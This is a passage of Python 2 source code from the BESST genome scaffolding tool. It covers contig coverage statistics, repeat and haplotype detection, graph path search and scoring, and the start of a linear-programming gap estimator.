    #coverages of longest contigs
    longest_contigs = list_of_cont_tuples[:50000]
    cov_of_longest_contigs = [Contigs[contig[1]].coverage for contig in longest_contigs]
    #Calculate mean coverage from the 1000 longest contigs
    n = float(len(cov_of_longest_contigs))
    mean_cov = sum(cov_of_longest_contigs) / n
    # If there is only one contig above the size threshold, n can be 1
    if n==1:
        n+=1

    std_dev = (sum(list(map((lambda x: x ** 2 - 2 * x * mean_cov + mean_cov ** 2), cov_of_longest_contigs))) / (n - 1)) ** 0.5
    extreme_obs_occur = True
    print >> Information, 'Mean coverage before filtering out extreme observations = ', mean_cov
    print >> Information, 'Std dev of coverage before filtering out extreme observations= ', std_dev

    ## SMOOTH OUT THE MEAN HERE by removing extreme observations ## 
    while extreme_obs_occur:
        extreme_obs_occur, filtered_list = RemoveOutliers(mean_cov, std_dev, cov_of_longest_contigs)
        n = float(len(filtered_list))
        try:
            mean_cov = sum(filtered_list) / n
        except ZeroDivisionError:
            break
        std_dev = (sum(list(map((lambda x: x ** 2 - 2 * x * mean_cov + mean_cov ** 2), filtered_list))) / (n - 1)) ** 0.5
        cov_of_longest_contigs = filtered_list

    print >> Information, 'Mean coverage after filtering = ', mean_cov
    print >> Information, 'Std coverage after filtering = ', std_dev
    print >> Information, 'Length of longest contig in calc of coverage: ', longest_contigs[0][0]
    print >> Information, 'Length of shortest contig in calc of coverage: ', longest_contigs[-1][0]


    if param.plots:
        plots.histogram(cov_of_longest_contigs, param, bins=50, x_label='coverage' , y_label='frequency' , title='BESST_cov_1000_longest_cont' + param.bamfile.split('/')[-1])

    return(mean_cov, std_dev)

def RemoveOutliers(mean_cov, std_dev, cov_list):
    k = normal.MaxObsDistr(len(cov_list), 0.95)
    filtered_list = list(filter((lambda x : (x < mean_cov + k * std_dev and x < 2 * mean_cov)), cov_list))
    if len(cov_list) > len(filtered_list):
        return(True, filtered_list)
    else:
        return(False, filtered_list)

def RepeatDetector(Contigs, Scaffolds, G, param, G_prime, small_contigs, small_scaffolds, Information):
    param.output_directory
    mean_cov = param.mean_coverage
    std_dev = param.std_dev_coverage
    cov_cutoff = param.cov_cutoff
    Repeats = []
    count_repeats = 0
    count_hapl = 0
    nr_of_contigs = len(Contigs)
    k = normal.MaxObsDistr(nr_of_contigs, 0.95)
    repeat_thresh = max(mean_cov + k * std_dev, 2 * mean_cov - 3*std_dev)
    if cov_cutoff:
        repeat_thresh = cov_cutoff
    print >> Information, 'Detecting repeats..'
    plot_cov_list = []
    for contig in Contigs:
        plot_cov_list.append(Contigs[contig].coverage)
        if Contigs[contig].coverage > repeat_thresh:
            count_repeats += 1
            cont_obj_ref = Contigs[contig]
            Repeats.append(cont_obj_ref)
            scaf_ = Contigs[contig].scaffold
            del Scaffolds[scaf_]
            G.remove_nodes_from([(scaf_, 'L'), (scaf_, 'R')])
            if param.extend_paths:
                G_prime.remove_nodes_from([(scaf_, 'L'), (scaf_, 'R')])
        #TEST DETECTOR
        if param.detect_haplotype and Contigs[contig].coverage < mean_cov / 2.0 + param.hapl_threshold * std_dev: # < mean_cov - 2.5*std_dev:
            count_hapl += 1
            #have indicator of possible haplotype
            Contigs[contig].is_haplotype = True


#    if param.extend_paths:
    for contig in small_contigs:
        plot_cov_list.append(small_contigs[contig].coverage)
        if small_contigs[contig].coverage > repeat_thresh:
            count_repeats += 1
            cont_obj_ref = small_contigs[contig]
            Repeats.append(cont_obj_ref)
            scaf_ = small_contigs[contig].scaffold
            del small_scaffolds[scaf_]
            G_prime.remove_nodes_from([(scaf_, 'L'), (scaf_, 'R')])
        #TEST DETECTOR
        if param.detect_haplotype and small_contigs[contig].coverage < mean_cov / 2.0 + param.hapl_threshold * std_dev: # < mean_cov - 2.5*std_dev:
            count_hapl += 1
            #have indicator of possible haplotype
            small_contigs[contig].is_haplotype = True


    if param.plots:
        plotting_ = filter(lambda x: x < 55 , plot_cov_list)
        plots.histogram(plotting_, param, bins=100, x_label='coverage' , y_label='frequency' , title='contigs_coverage' + param.bamfile.split('/')[-1])

    GO.PrintOutRepeats(Repeats, Contigs, param.output_directory, small_contigs)
    print >> Information, 'Removed a total of: ', count_repeats, ' repeats. With coverage larger than ', repeat_thresh
    #sys.exit()
    if param.detect_haplotype:
        print >> Information, 'Marked a total of: ', count_hapl, ' potential haplotypes.'
    return(Contigs, Scaffolds, G)





def PosDirCalculatorPE(cont_dir1, read_dir, cont1pos, readpos, s1len, cont1_len, cont_dir2, mate_dir, cont2pos, matepos, s2len, cont2_len, read_len):
    if cont_dir1 and read_dir:
        obs1 = s1len - cont1pos - readpos
        scaf_side1 = 'R'
    if cont_dir2 and mate_dir:
        obs2 = s2len - cont2pos - matepos
        scaf_side2 = 'R'
    if (not cont_dir1) and read_dir:
        obs1 = cont1pos + (cont1_len - readpos)
        scaf_side1 = 'L'
    if (not cont_dir2) and mate_dir:
        obs2 = cont2pos + (cont2_len - matepos)
        scaf_side2 = 'L'
    if cont_dir1 and not read_dir:
        obs1 = cont1pos + readpos + read_len
        scaf_side1 = 'L'
    if cont_dir2 and not mate_dir:
        obs2 = cont2pos + matepos + read_len
        scaf_side2 = 'L'
    if not cont_dir1 and not read_dir:
        obs1 = s1len - cont1pos - (cont1_len - readpos - read_len)
        scaf_side1 = 'R'
    if not cont_dir2 and not mate_dir:
        obs2 = s2len - cont2pos - (cont2_len - matepos - read_len)
        scaf_side2 = 'R'
    return(int(obs1), int(obs2), scaf_side1, scaf_side2)

def PosDirCalculatorMP(cont_dir1, read_dir, cont1pos, readpos, s1len, cont1_len, cont_dir2, mate_dir, cont2pos, matepos, s2len, cont2_len, read_len):
    if cont_dir1 and not read_dir:
        obs1 = s1len - cont1pos - readpos
        scaf_side1 = 'R'
    if cont_dir2 and not mate_dir:
        obs2 = s2len - cont2pos - matepos
        scaf_side2 = 'R'
    if (not cont_dir1) and not read_dir:
        obs1 = cont1pos + (cont1_len - readpos)
        scaf_side1 = 'L'
    if (not cont_dir2) and not mate_dir:
        obs2 = cont2pos + (cont2_len - matepos)
        scaf_side2 = 'L'
    if cont_dir1 and read_dir:
        obs1 = cont1pos + readpos + read_len
        scaf_side1 = 'L'
    if cont_dir2 and mate_dir:
        obs2 = cont2pos + matepos + read_len
        scaf_side2 = 'L'
    if not cont_dir1 and read_dir:
        obs1 = s1len - cont1pos - (cont1_len - readpos - read_len)
        scaf_side1 = 'R'
    if not cont_dir2 and mate_dir:
        obs2 = s2len - cont2pos - (cont2_len - matepos - read_len)
        scaf_side2 = 'R'
    return(int(obs1), int(obs2), scaf_side1, scaf_side2)


/n/n/nBESST/ExtendLargeScaffolds.py/n/n
'''
    Created on Jun 21, 2012
    
    @author: ksahlin
    
    This file is part of BESST.
    
    BESST is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
    
    BESST is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
    
    You should have received a copy of the GNU General Public License
    along with BESST.  If not, see <http://www.gnu.org/licenses/>.
    '''

import time
import networkx as nx
from collections import defaultdict
import multiprocessing as mp
import heapq

def ScorePaths(G, paths, all_paths, param):
    if len(paths) == 0:
        return ()

    def calculate_connectivity(path, G):
        """"""
            Contig ends has even or odd numbered placements (index) in the path list. In case
            of contamination, good links are between an even to an odd indexed contig-end, or vice versa.

        """"""
        bad_link_weight = 0
        good_link_weight = 0
        links_not_in_path = 0
        links_wrong_orientation_in_path = 0
        even, odd = path[::2], path[1::2]
        nodes_even = set(even)
        nodes_odd = set(odd)
        visited = set()
        for i, node in enumerate(path):
            for nbr in G.neighbors(node):
                if i % 2 == 0 and node[0] != nbr[0]:
                    if nbr in nodes_odd:
                        if nbr not in visited:
                            good_link_weight += G[node][nbr]['nr_links']
                        else:
                            pass
                    else:
                        bad_link_weight += G[node][nbr]['nr_links']
                elif i % 2 == 1 and node[0] != nbr[0]:
                    if nbr not in nodes_even:
                        bad_link_weight += G[node][nbr]['nr_links']
                    elif nbr not in visited:
                        bad_link_weight += G[node][nbr]['nr_links']
            visited.add(node)
        good_link_weight = good_link_weight
        bad_link_weight = bad_link_weight
        try:
            score = good_link_weight / float(bad_link_weight)
        except ZeroDivisionError:
            score = good_link_weight

        return score, bad_link_weight


    def calculate_connectivity_contamination(path, G):
        """"""
            Contig ends has even or odd numbered placements (index) in the path list. In case
            of contamination, good links are between an even to an odd indexed contig-end, or vice versa.

        """"""
        bad_link_weight = 0
        good_link_weight = 0
        links_not_in_path = 0
        links_wrong_orientation_in_path = 0
        even, odd = path[::2], path[1::2]
        nodes_even = set(even)
        nodes_odd = set(odd)
        for i, node in enumerate(path):
            for nbr in G.neighbors(node):
                if i % 2 == 0 and node[0] != nbr[0]:
                    if nbr in nodes_odd:
                        good_link_weight += G[node][nbr]['nr_links']
                    else:
                        bad_link_weight += G[node][nbr]['nr_links']
                elif i % 2 == 1 and node[0] != nbr[0]:
                    if nbr in nodes_even:
                        good_link_weight += G[node][nbr]['nr_links']
                    else:
                        bad_link_weight += G[node][nbr]['nr_links']
        good_link_weight = good_link_weight/2
        bad_link_weight = bad_link_weight

        # ###############


        try:
            score = good_link_weight / float(bad_link_weight)
        except ZeroDivisionError:
            score = good_link_weight

        return score, bad_link_weight


    #print '\nSTARTING scoring paths:'
    for path_ in paths:
        path = path_[0]
        path_len = path_[1]
        #calculate spanning score s_ci
        if param.contamination_ratio:
            score, bad_link_weight = calculate_connectivity_contamination(path, G)
        else:
            score, bad_link_weight = calculate_connectivity(path, G)


        if param.no_score and score >= param.score_cutoff:
            all_paths.append([score, bad_link_weight, path, path_len])
            #Insert_path(all_paths, score, path , bad_link_weight, path_len)
        elif len(path) > 2 and score >= param.score_cutoff: #startnode and end node are not directly connected
            all_paths.append([score, bad_link_weight, path, path_len])
            #Insert_path(all_paths, score, path , bad_link_weight, path_len)

    return ()

def find_all_paths_for_start_node_BFS(graph, start, end, already_visited, is_withing_scaf, max_path_length_allowed, param):
    path = []
    paths = []
    if start[1] == 'L':
        forbidden = set()
        forbidden.add((start[0], 'R'))
    else:
        forbidden = set()
        forbidden.add((start[0], 'L'))

    #Joining within scaffolds
    if is_withing_scaf:
        element = end.pop()
        end.add(element)
        if element[1] == 'L':
            forbidden.add((element[0], 'R'))
        else:
            forbidden.add((element[0], 'L'))


    #TODO: Have length criteria that limits the path lenght due to complecity reasons. Can also identify strange
    #links by looking how many neighbors a contig has and how mych the library actually can span
    path_len = 0
    queue = [(start, path, path_len)]#, sum_path)]
    #prev_node = start
    counter = 0
    while queue:
        #prev_node = start
        counter += 1
        #if counter % 100 == 0:
        #    print 'Potential paths:', counter, 'paths found: ', len(paths)
        if counter > param.path_threshold or len(path) > 100:
            print 'Hit path_threshold of {0} iterations! consider increase --iter <int> parameter to over {0} if speed of BESST is not a problem. Standard increase is, e.g., 2-10x of current value'.format(param.path_threshold)
            break
            
        start, path, path_len = queue.pop() #start, end, path, sum_path = queue.pop()  
        try:
            prev_node = path[-1]
        except IndexError:
            prev_node = start
        path = path + [start]
        path_len = len(path)
        #print 'PATH', path ,'end', end 
        if path_len > max_path_length_allowed: #All possible paths can be exponential!! need something to stop algorithm in time
            continue
        #if score < score_best_path: # need something to stop a bad path
        #    continue
        if start in already_visited or start in forbidden:
            continue

        if start in end:
            # if (start_node, start) in nodes_present_in_path:
            #     nodes_present_in_path[(start_node, start)] = nodes_present_in_path[(start_node, start)].union(path)
            # else:
            #     nodes_present_in_path[(start_node, start)] = set(path)
            paths.append((path, path_len))
            continue


        if  prev_node[0] != start[0]:
            if start[1] == 'L' and (start[0], 'R') not in forbidden:
                queue.append(((start[0], 'R'), path, path_len)) #, sum_path + graph[start][(start[0], 'R')]['nr_links']))
            elif start[1] == 'R' and (start[0], 'L') not in forbidden:
                queue.append(((start[0], 'L'), path, path_len))#, sum_path + graph[start][(start[0], 'L')]['nr_links']))                
        else:
            for node in set(graph[start]).difference(path):
                if node not in forbidden: # and node not in already_visited: 
                    try: # if last node (i.e. ""end"") it is not present in small_scaffolds and it should not be included in the length
                        queue.append((node, path, path_len + graph[node[0]]['length'])) #  small_scaffolds[node[0]].s_length))   #
                    except KeyError:
                        queue.append((node, path, path_len))

    return paths


def find_all_paths_for_start_node_DFS(graph, start, end, already_visited, is_withing_scaf, max_path_length_allowed, param):
    path = []
    paths = []
    if start[1] == 'L':
        forbidden = set()
        forbidden.add((start[0], 'R'))
    else:
        forbidden = set()
        forbidden.add((start[0], 'L'))

    #Joining within scaffolds
    if is_withing_scaf:
        element = end.pop()
        end.add(element)
        if element[1] == 'L':
            forbidden.add((element[0], 'R'))
        else:
            forbidden.add((element[0], 'L'))


    #TODO: Have length criteria that limits the path lenght due to complecity reasons. Can also identify strange
    #links by looking how many neighbors a contig has and how mych the library actually can span
    path_len = 0
    heap = [(0,(start, path, path_len))]#, sum_path)]
    #prev_node = start
    counter = 0
    while heap:
        #prev_node = start
        counter += 1
        #if counter % 100 == 0:
        #    print 'Potential paths:', counter, 'paths found: ', len(paths)
        if counter > param.path_threshold or len(path) > 100:
            print 'Hit path_threshold of {0} iterations! consider increase --iter <int> parameter to over {0} if speed of BESST is not a problem. Standard increase is, e.g., 2-10x of current value'.format(param.path_threshold)
            break
            
        nr_links, (start, path, path_len) = heapq.heappop(heap) #start, end, path, sum_path = heapq.pop()  
        try:
            prev_node = path[-1]
        except IndexError:
            prev_node = start
        path = path + [start]
        path_len = len(path)
        #print 'PATH', path ,'end', end 
        if path_len > max_path_length_allowed: #All possible paths can be exponential!! need something to stop algorithm in time
            continue
        #if score < score_best_path: # need something to stop a bad path
        #    continue
        if start in already_visited or start in forbidden:
            continue

        if start in end:
            # if (start_node, start) in nodes_present_in_path:
            #     nodes_present_in_path[(start_node, start)] = nodes_present_in_path[(start_node, start)].union(path)
            # else:
            #     nodes_present_in_path[(start_node, start)] = set(path)
            paths.append((path, path_len))
            continue


        if  prev_node[0] != start[0]:
            nr_links = 2**16 # large number to give high priority to this intra-contig edge in this two node representation
            if start[1] == 'L' and (start[0], 'R') not in forbidden:
                heapq.heappush(heap, (nr_links, ((start[0], 'R'), path, path_len))) #, sum_path + graph[start][(start[0], 'R')]['nr_links']))
            elif start[1] == 'R' and (start[0], 'L') not in forbidden:
                heapq.heappush(heap, (nr_links, ((start[0], 'L'), path, path_len)))#, sum_path + graph[start][(start[0], 'L')]['nr_links']))                
        else:
            for node in set(graph[start]).difference(path):
                if node not in forbidden: # and node not in already_visited: 
                    # try: # if last node (i.e. ""end"") it is not present in small_scaffolds and it should not be included in the length
                    #     heapq.heappush(heap, (nr_links, node, path, path_len + graph[node[0]]['length'])) #  small_scaffolds[node[0]].s_length))   #
                    # except KeyError:
                    nr_links = graph[start][node]['nr_links']
                    heapq.heappush(heap, (nr_links, (node, path, path_len)))

    return paths


def BetweenScaffolds(G_prime, end, iter_nodes, param):
    # here we should have a for loop looping over all start nodes. Start nodes already examined should be removed in a nice way to skip over counting
    already_visited = set()
    all_paths = []
    print 'Entering ""find_all_paths_for_start_node"" '
    iter_count = 0
    cnter = 0
    if param.max_extensions:
        iter_threshold = param.max_extensions
    else: 
        iter_threshold = len(end)

    print 'iterating until maximum of {0} extensions.'.format(iter_threshold) 
    print 'nodes:{0}, edges: {1}'.format(len(G_prime.nodes()), len(G_prime.edges()))
    while len(iter_nodes) > 0 and iter_count <= iter_threshold:
        iter_count += 1
        start_node = iter_nodes.pop()
        if cnter % 100 == 0:
            print 'enter Betwween scaf node: ', cnter
        end.difference_update(set([start_node]))
        if param.bfs_traversal:
            paths = find_all_paths_for_start_node_BFS(G_prime, start_node, end, already_visited, 0, 2 ** 32, param)
        else:
            paths = find_all_paths_for_start_node_DFS(G_prime, start_node, end, already_visited, 0, 2 ** 32, param)

        already_visited.add(start_node)
        ScorePaths(G_prime, paths, all_paths, param)
        cnter += 1
    #all_paths = ExtendScaffolds(all_paths)
    #print all_paths
    print 'Total nr of paths found: {0} with score larger than: {1}'.format(len(all_paths), param.score_cutoff)
    all_paths.sort(key=lambda list_: list_[0]) 
    #print all_paths
    return(all_paths)

def WithinScaffolds(G, G_prime, start, end_node, already_visited, max_path_length, param):
    end = set()
    end.add(end_node)
    all_paths = []
    already_visited.difference_update(set([start, end_node]))
    if param.bfs_traversal:
        paths = find_all_paths_for_start_node_BFS(G_prime, start, end, already_visited, 1, max_path_length, param)
    else:
        paths = find_all_paths_for_start_node_DFS(G_prime, start, end, already_visited, 1, max_path_length, param)

    already_visited.add(start)
    already_visited.add(end_node)
    #print paths
    if len(paths) > 1:
        ScorePaths(G_prime, paths, all_paths,param)
        all_paths.sort(key=lambda list_: list_[0]) 

        if len(all_paths) > 0:
            return all_paths

    return []

if __name__ == '__main__':
    import Scaffold
    small_scaffolds_test = {}
    for i in range(1, 7):
        S = Scaffold.scaffold(i, 0, 0, {}, {})
        small_scaffolds_test[S.name] = S
    start = time()
    G_prime = nx.Graph()
    #G.add_nodes_from([(1, 'L'), (1, 'R'), (2, 'L'), (2, 'R'), (3, 'L'), (3, 'R'), (4, 'L'), (4, 'R'), (5, 'L'), (5, 'R')]) 
    for i in range(1, 7):
        G_prime.add_edge((i, 'L'), (i, 'R'), {'nr_links':0})
    G_prime.add_edges_from([((1, 'R'), (2, 'R'), {'nr_links':1}), ((3, 'L'), (4, 'L'), {'nr_links':1}), ((2, 'L'), (3, 'R'), {'nr_links':1}), ((1, 'R'), (5, 'L'), {'nr_links':2}),
                       ((5, 'R'), (4, 'L'), {'nr_links':3}), ((2, 'L'), (5, 'L'), {'nr_links':2}), ((1, 'R'), (4, 'L'), {'nr_links':8}), ((2, 'L'), (6, 'L'), {'nr_links':3}),
                       ((1, 'L'), (4, 'R'), {'nr_links':1}), ((1, 'L'), (4, 'L'), {'nr_links':1}), ((3, 'L'), (4, 'R'), {'nr_links':1}),
                        ((1, 'R'), (2, 'L'), {'nr_links':1}), ((1, 'R'), (5, 'R'), {'nr_links':1}), ((2, 'L'), (5, 'R'), {'nr_links':1})])
    G = nx.Graph()
    G.add_nodes_from([(1, 'L'), (1, 'R'), (4, 'L'), (4, 'R'), (6, 'L'), (6, 'R')])
    contigs = [1, 2, 3, 4, 5, 6]

    print 'Between'
    BetweenScaffolds(G, G_prime, small_scaffolds_test)
    start_node = (1, 'R')
    end_node = (4, 'L')
    print 'Within'
    already_visited = set(G.nodes())
    print already_visited
    WithinScaffolds(G, G_prime, small_scaffolds_test, start_node, end_node, already_visited, 0)
    elapsed = time() - start
    print 'time all paths: ', elapsed


/n/n/nBESST/order_contigs.py/n/n'''
    Created on May 30, 2014

    @author: ksahlin

    This file is part of BESST.

    BESST is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    BESST is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with BESST.  If not, see <http://www.gnu.org/licenses/>.
    '''

import copy
import math
import random
from collections import Counter
import cPickle
import os
import subprocess
import mathstats.log_normal_param_est as lnpe


#import numpy as np


from mathstats.normaldist.normal import normpdf
from mathstats.normaldist.truncatedskewed import param_est as GC

from BESST.lp_solve import lp_solve


class LpForm(object):
    """"""docstring for LpForm""""""
    def __init__(self):
        super(LpForm, self).__init__()
        self.rows = []
        self.b = []

    def add_objective(self, obj):
        self.obj = obj

    def add_constraint(self, expression, value):
        self.rows.append(expression)
        self.b.append(value)

    def standard_form(self):
        """"""
         Converts Ax' <=b
         to Ax = b, b >= 0
         by introducing slack/surplus variables
        """"""

        A = []
        c = []

        # build full tableau and convert to normal form if negative constants
        tot_slack_variables = len(self.rows)

        for i in range(len(self.rows)):
            ident = [0 for r in range(len(self.rows))]
            
            # if negative constant
            if self.b[i] < 0:
                # add a surplus variable 
                ident[i] = -1
                #reverse all other values
                self.rows[i] = [ -k for k in self.rows[i] ]
                self.rows[i] += ident 
                # change sign of constant
                self.b[i] = -self.b[i]

            # if positive constant
            else:
                # add a slack varaible
                ident[i] = 1
                self.rows[i] += ident
            
        A = self.rows

        c = self.obj + [0]*tot_slack_variables 
        return A, self.b, c


class Contig(object):
    """"""Container with contig information for a contig in a path""""""
    def __init__(self, index, length):
        super(Contig, self).__init__()
        self.index = index
        self.length = length
        self.position = None
        

class Path(object):
    """"""Contains all information of a path. This is basically a supgraph of the 
    Scaffold graph in BESST contianing all contigs in a path that has high score 
    and is going to be made into a scaffold. 

    Path is an object with methods for calculating likelihood of a path given link observations.
    Due to computational requiremants, we don't calculate the true likelihoos all paths usually have thousands
    of links. Instead, we take the average link obervation between all contigs. This will not give true ML 
    estimates but speeds up calculation with thousands of x order. In practice, using average link obervation 
    For ML estimation will give a fairly good prediction. For this cheat, see comment approx 15 lines below.  """"""
    def __init__(self, ctg_lengths, observations, param):
        super(Path, self).__init__()
        self.mean = param.mean_ins_size
        self.stddev = param.std_dev_ins_size
        self.read_len = param.read_len
        self.contamination_ratio = param.contamination_ratio
        self.contamination_mean = param.contamination_mean
        self.contamination_stddev = param.contamination_stddev
        self.ctgs = []
        self.ctg_lengths = ctg_lengths
        for i,length in enumerate(ctg_lengths):
            self.ctgs.append(Contig(i, length))
        self.ctgs = tuple(self.ctgs)
        self.gaps = [0]*(len(ctg_lengths)-1) # n contigs has n-1 gaps between them, start with gap size 0  
        
        # get positions for when all gaps are 0
        self.update_positions()

        # let us cheat here! Instead of calculating likeliooods of thousands of
        # onservations we calculate the ikelihood for them average (mean) of the
        # observations and weight it with the number of observations
        self.mp_links = 0.0
        self.pe_links = 0.0
        obs_dict = {}


        if all(length in self.ctg_lengths for length in [670, 2093]) or all(length in self.ctg_lengths for length in [900, 3810]) or all(length in self.ctg_lengths for length in [2528, 591]) or all(length in self.ctg_lengths for length in [734, 257, 1548]):
            print >> param.information_file, ''
            print >> param.information_file, '' 
            print >> param.information_file, 'Setting up path', ctg_lengths
            for c1,c2,is_PE_link in observations:
                mean_obs, nr_obs, stddev_obs, list_of_obs = observations[(c1,c2,is_PE_link)]
                if is_PE_link:
                    mean_PE_obs = self.ctgs[c1].length + self.ctgs[c2].length - observations[(c1,c2,is_PE_link)][0] + 2*param.read_len
                    list_of_obs = [ self.ctgs[c1].length + self.ctgs[c2].length - obs + 2*param.read_len for obs in list_of_obs]
                    print >> param.information_file, 'PE LINK, mean obs:', mean_PE_obs, 'stddev obs:', stddev_obs, 'nr obs:', nr_obs, 'c1 length', self.ctgs[c1].length, 'c2 length', self.ctgs[c2].length
                    obs_dict[(c1, c2, is_PE_link)] = (mean_PE_obs, nr_obs, stddev_obs, list_of_obs)
                    self.pe_links += nr_obs
                    # if mean_PE_obs > self.contamination_mean + 6 * self.contamination_stddev:
                    #     self.observations = None
                    #     return None
                else:
                    #mean_obs = sum(observations[(c1,c2,is_PE_link)])/nr_obs
                    print >> param.information_file, 'MP LINK, mean obs:', mean_obs, 'stddev obs:', stddev_obs, 'nr obs:', nr_obs, 'c1 length', self.ctgs[c1].length, 'c2 length', self.ctgs[c2].length

                    obs_dict[(c1, c2, is_PE_link)] = (mean_obs, nr_obs, stddev_obs, list_of_obs)
                    self.mp_links += nr_obs
            print >> param.information_file, ''
            print >> param.information_file, ''


        for c1,c2,is_PE_link in observations:
            #nr_obs = len(observations[(c1,c2,is_PE_link)])
            mean_obs, nr_obs, stddev_obs, list_of_obs = observations[(c1,c2,is_PE_link)]
            if is_PE_link:
                mean_PE_obs = self.ctgs[c1].length + self.ctgs[c2].length - observations[(c1,c2,is_PE_link)][0] + 2*param.read_len 
                list_of_obs = [ self.ctgs[c1].length + self.ctgs[c2].length - obs + 2*param.read_len for obs in list_of_obs]
                #PE_obs = map(lambda x: self.ctgs[c1].length + self.ctgs[c2].length - x + 2*param.read_len ,observations[(c1,c2,is_PE_link)])
                #mean_obs = sum( PE_obs)/nr_obs
                obs_dict[(c1, c2, is_PE_link)] = (mean_PE_obs, nr_obs, stddev_obs, list_of_obs)
                self.pe_links += nr_obs
                # if mean_PE_obs > self.contamination_mean + 6 * self.contamination_stddev and not initial_path:
                #     self.observations = None
                #     return None
            else:
                #mean_obs = sum(observations[(c1,c2,is_PE_link)])/nr_obs
                obs_dict[(c1, c2, is_PE_link)] = (mean_obs, nr_obs, stddev_obs, list_of_obs)
                self.mp_links += nr_obs
            

        self.observations = obs_dict
        #print self.observations


        # for c1,c2 in self.observations:
        #     if self.observations[(c1,c2)][0] > 1500:
        #         print self.observations


    def get_distance(self,start_index,stop_index):
        total_contig_length = sum(map(lambda x: x.length ,filter(lambda x: start_index <= x.index < stop_index, self.ctgs) ))
        total_gap_length = sum(self.gaps[start_index:stop_index])
        index_adjusting = len(self.gaps[start_index:stop_index]) # one extra bp shifted each time
        return (total_contig_length, total_gap_length, index_adjusting)

    def update_positions(self):
        for ctg in self.ctgs:
            index = ctg.index
            ctg.position = sum(self.get_distance(0,index))

    # def get_inferred_isizes(self):
    #     self.isizes = {}

    #     for (c1,c2,is_PE_link) in self.observations:
    #         gap = self.ctgs[c2].position - (self.ctgs[c1].position + self.ctgs[c1].length) - (c2-c1) # last thing is an index thing
    #         #x = map(lambda obs: obs[0] + gap , self.observations[(c1,c2)]) # inferr isizes
    #         x = self.observations[(c1,c2,is_PE_link)][0] + gap
    #         self.isizes[(c1,c2,is_PE_link)] = x

    # def get_GapEst_isizes(self):
    #     self.gapest_predictions = {}
    #     for (i,j,is_PE_link) in self.observations:
    #         mean_obs = self.observations[(i,j,is_PE_link)][0]
    #         if is_PE_link:
    #             self.gapest_predictions[(i,j,is_PE_link)] = self.observations[(i,j,is_PE_link)][0] + GC.GapEstimator(self.contamination_mean, self.contamination_stddev, self.read_len, mean_obs, self.ctgs[i].length, self.ctgs[j].length)
    #         else:
    #             self.gapest_predictions[(i,j,is_PE_link)] = self.observations[(i,j,is_PE_link)][0] + GC.GapEstimator(self.mean, self.stddev, self.read_len, mean_obs, self.ctgs[i].length, self.ctgs[j].length)

    #         #print mean_obs, self.ctgs[i].length, self.ctgs[j].length, 'gap:' ,  GC.GapEstimator(self.mean, self.stddev, self.read_len, mean_obs, self.ctgs[i].length, self.ctgs[j].length)
        


    # def new_state_for_ordered_search(self,start_contig,stop_contig,mean,stddev):
    #     """"""
    #         This function gives a new state between two contigs c1 and c2 in the contig path
    #         that we will change the gap size for.
    #         Currently, we change the gap to expected_mean_obs - mean_observation, e.g. a
    #         semi-naive estimation. More variablity in gap prediction could be acheved in the 
    #         same way as described for function propose_new_state_MCMC().
             
    #     """"""
    #     new_path = copy.deepcopy(self) # create a new state
    #     (c1,c2) = (start_contig,stop_contig)
    #     mean_obs = self.observations[(c1,c2,0)][0] if (c1,c2,0) in self.observations else self.observations[(c1,c2,1)][0]  # take out observations and
    #     exp_mean_over_bp = mean + stddev**2/float(mean+1)
    #     proposed_distance = exp_mean_over_bp - mean_obs # choose what value to set between c1 and c2 

    #     #print 'CHOSEN:', (c1,c2), 'mean_obs:', mean_obs, 'proposed distance:', proposed_distance
    #     (total_contig_length, total_gap_length, index_adjusting) = self.get_distance(c1+1,c2)
    #     #print 'total ctg length, gap_lenght,index adjust', (total_contig_length, total_gap_length, index_adjusting)
    #     avg_suggested_gap = (proposed_distance - total_contig_length) / (c2-c1)
    #     #print avg_suggested_gap, proposed_distance, total_contig_length, c2-c1
    #     for index in range(c1,c2):
    #         new_path.gaps[index] = avg_suggested_gap
    #     #new_path.gaps[index] = proposed_distance
    #     return new_path


    # def calc_log_likelihood(self,mean,stddev):
    #     log_likelihood_value = 0
    #     exp_mean_over_bp = mean + stddev**2/float(mean+1)
    #     for (c1,c2) in self.isizes:
    #         log_likelihood_value += math.log( normpdf(self.isizes[(c1,c2)],exp_mean_over_bp, stddev) ) * self.observations[(c1,c2)][1]
    #         #for isize in self.isizes[(c1,c2)]:
    #         #    log_likelihood_value += math.log( normpdf(isize,mean,stddev) )
            
    #     return log_likelihood_value

    # def calc_dist_objective(self):
    #     objective_value = 0
    #     self.get_GapEst_isizes()
    #     for (c1,c2, is_PE_link) in self.isizes:
    #         objective_value += abs(self.gapest_predictions[(c1,c2,is_PE_link)] - self.isizes[(c1,c2,is_PE_link)]) * self.observations[(c1,c2,is_PE_link)][1]
    #         #for isize in self.isizes[(c1,c2)]:
    #         #    objective_value += math.log( normpdf(isize,mean,stddev) )
            
    #     return objective_value

    def make_path_dict_for_besst(self):
        path_dict = {}
        for ctg1,ctg2 in zip(self.ctgs[:-1],self.ctgs[1:]):
            path_dict[(ctg1,ctg2)] = ctg2.position - (ctg1.position + ctg1.length) - 1
        #print path_dict
        return path_dict


    # def calc_probability_of_LP_solution(self, help_variables):
    #     log_prob = 0
    #     for (i,j,is_PE_link),variable in help_variables.iteritems():
    #         print self.contamination_ratio * self.observations[(i,j,is_PE_link)][1] * normpdf(variable.varValue,self.contamination_mean,self.contamination_stddev)
    #         if is_PE_link:
    #             try:
    #                 log_prob += math.log(self.contamination_ratio * self.observations[(i,j,is_PE_link)][1] * normpdf(variable.varValue,self.contamination_mean,self.contamination_stddev)) 
    #             except ValueError:
    #                 log_prob += - float(""inf"")
    #         else:
    #             try:
    #                 log_prob += math.log((1 - self.contamination_ratio) * self.observations[(i,j,is_PE_link)][1]* normpdf(variable.varValue,self.contamination_mean,self.contamination_stddev)) 
    #             except ValueError:
    #                 log_prob += - float(""inf"")
    #     return log_prob

    def LP_solve_gaps(self,param):
        exp_means_gapest = {}

        for (i,j,is_PE_link) in self.observations:
            mean_obs = self.observations[(i,j,is_PE_link)][0]
            if is_PE_link:
